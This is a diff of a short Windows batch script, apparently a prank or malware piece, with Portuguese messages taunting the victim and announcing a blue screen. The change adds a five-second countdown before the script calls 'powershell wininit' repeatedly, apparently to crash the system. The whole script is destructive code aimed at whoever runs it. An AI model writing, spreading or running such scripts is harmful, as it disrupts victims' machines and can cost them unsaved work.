@@ -8,7 +8,8 @@ title fudeu
 echo ====================================
 echo Voce foi ferrado e fudido kkkkkkkkkk
 echo ====================================
-echo Dando tela azul em 0 segundos...
+echo Dando tela azul em 5 segundos...
+timeout /t 5 > nul
 powershell wininit
 powershell wininit
 powershell wininit
